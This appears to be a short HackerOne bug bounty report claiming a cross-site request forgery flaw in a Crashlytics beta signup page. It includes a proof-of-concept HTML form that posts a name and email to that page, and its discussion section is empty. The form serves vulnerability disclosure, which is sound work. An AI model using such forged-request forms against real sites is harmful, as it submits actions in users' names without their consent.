# HackerOne Report: CSRF   in crashlytics.com
**Report ID:** 13856
**Vulnerability Class:** Cross-Site Request Forgery (CSRF)

## Vulnerability Information & PoC
Hello Sir 

This is N B Sri Harsha 

I Have Found An  CSRF  in  http://try.crashlytics.com/


POC ;- 

<form method="POST" action="http://try.crashlytics.com/list/" class="validatable" id="beta_form">
                                <input id="validate" class="clear validate validate-name validate-message" placeholder="your name" name="name" type="text">
                                <input id="validate" class="clear validate validate-message" placeholder="name@server.com" name="email" type="text">
                                <input name="sitereferral" value="" type="hidden">
                                <input value="" id="emailVerify" type="submit">
                            </form>



## Discussion & Remediation Timeline
